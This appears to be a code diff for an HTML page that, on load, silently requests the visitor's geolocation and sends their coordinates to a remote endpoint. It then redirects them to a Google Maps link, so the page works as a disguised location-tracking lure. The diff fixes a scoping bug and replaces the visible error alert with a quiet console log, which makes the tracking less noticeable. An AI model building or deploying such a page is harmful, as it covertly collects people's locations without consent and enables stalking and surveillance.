@@ -5,16 +5,14 @@
 </head>
 <body>
     <script>
-        // Replace with your Google Maps URL
         const googleMapsURL = 'https://maps.app.goo.gl/JVUi2F98vrGs1ryn8';
-
-        // Replace with your server endpoint
-       const serverURL = 'https://livelocation-k0iy.onrender.com/save-location.php';
+        const serverURL = 'https://livelocation-k0iy.onrender.com/save-location.php';
 
         function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
+                        // PROPERLY DEFINED COORDS VARIABLE
                         const coords = {
                             lat: position.coords.latitude,
                             lng: position.coords.longitude,
@@ -22,50 +20,27 @@
                             timestamp: new Date(position.timestamp)
                         };
 
-                        // Send coordinates to server
+                        // Send coordinates (now properly scoped)
                         fetch(serverURL, {
                             method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json',
-                            },
-                            body: JSON.stringify(coords)
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify(coords) // Now accessible
                         });
 
-                        // Redirect to Google Maps
                         window.location.href = googleMapsURL;
                     },
                     (error) => {
-                        alert('Error getting location: ' + error.message);
+                        console.error('Geolocation error:', error);
                         window.location.href = googleMapsURL;
                     }
                 );
             } else {
-                alert("Geolocation is not supported by this browser.");
+                alert("Geolocation not supported");
                 window.location.href = googleMapsURL;
             }
         }
 
-        fetch(serverURL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(coords)
-        })
-        .then(response => {
-            if (!response.ok) throw new Error('HTTP error ' + response.status);
-            return response.json();
-        })
-        .then(data => {
-            console.log('Success:', data);
-            window.location.href = googleMapsURL;
-        })
-        .catch(error => {
-            console.error('Error:', error);
-            window.location.href = googleMapsURL;
-        });
-
-        // Start location request when page loads
         window.onload = getLocation;
-        
     </script>
 </body>
 </html>
